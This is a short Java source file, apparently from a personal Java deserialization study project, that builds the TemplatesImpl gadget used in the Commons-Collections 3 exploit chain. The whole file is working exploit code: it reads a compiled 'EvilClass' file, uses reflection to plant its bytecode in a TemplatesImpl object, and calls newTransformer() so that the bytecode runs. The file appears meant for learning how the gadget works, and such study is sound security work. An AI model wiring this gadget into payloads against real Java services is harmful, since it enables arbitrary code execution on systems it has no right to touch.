package exp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class CC3Exp1 {
    public static void main(String[] args) throws Exception {
        byte[] evil = Files.readAllBytes(Paths.get("/home/n0zom1z0/Desktop/Java-Sec/Deserialization/CC3again/target/classes/assets/EvilClass.class"));
        byte[][] _bytecodes = {evil};

        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "notnull");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, _bytecodes);

        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());

        templates.newTransformer();
    }
}
